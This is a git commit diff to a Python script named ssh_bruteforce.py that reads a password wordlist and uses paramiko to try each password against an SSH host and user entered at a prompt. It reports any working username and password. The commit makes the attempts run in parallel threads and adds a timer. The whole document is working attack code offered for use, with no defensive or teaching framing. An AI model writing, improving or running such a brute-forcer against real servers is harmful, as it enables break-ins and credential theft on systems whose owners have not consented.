313f6c89fc37abc1be3c88b6176d57718dbc453a
Elliot-171 <sg5107709@gmail.com>
2025-10-03 13:00:31 +0530

    SSH BruteForcer with threading

--- ssh_bruteforce.py
+++ ssh_bruteforce.py
@@ -11,22 +11,22 @@ BLUE=Fore.BLUE
 GREEN=Fore.GREEN
 RED=Fore.RED
 RESET=Fore.RESET
-
+ti=time.perf_counter()
 def is_ssh_open(host,user,passw):
    client=paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
      client.connect(hostname=host,username=user,password=passw,timeout=3)
    except socket.timeout:
-     print(f"{RED}[!]Host:{host} is unreachable. Timed out.{RESET}")
+     print(f"{RED}[!]Host:{host} is unreachable. Timed out.{RESET}\n")
      return False
      
    except paramiko.AuthenticationException:
-     print(f"[!]Invalid credentials for {user}:{passw}")
+     print(f"[!]Invalid credentials for {user}:{passw}\n")
      return False
      
    except paramiko.SSHException:
-     print(f"{BLUE}[*]Connection Quota Exceeded, retrying after sometime...{RESET}")
+     print(f"{BLUE}[*]Connection Quota Exceeded, retrying after sometime...{RESET}\n")
      
      time.sleep(60)
      
@@ -35,22 +35,28 @@ def is_ssh_open(host,user,passw):
    else:
      print(f"{GREEN}Found connection:\n\tHOSTNAME:{host}\n\tUSERNAME:{user}\n\tPASSWORD:{passw}{RESET}")
      return True
-     
 
+        
 
 host=""  
 host=input("Enter host ip address :")
 user=input("Enter host username:")
 
 lst=[]
-passlist=open("worlist.txt")
+passlist=open(r"C:\Users\sg510\worlist.txt","r")
 st=passlist.read()
 lst=st.splitlines()
 threads=[]
 for password in lst:
-  if is_ssh_open(host,user,password):
-    fh=open("creds.txt","w")
-    fh.write("{user}@{host}:{password}")
+     thread_daemon=threading.Thread(target=is_ssh_open,args=(host,user,password,))
+     thread_daemon.setDaemon(True)
+     threads.append(thread_daemon)
 
-  
-    
+for thread in threads:
+    thread.start()
+
+for thread in threads:
+    thread.join()
+t=time.perf_counter()
+
+print(f"Time taken:{(t-ti)/1000:.9f}s")
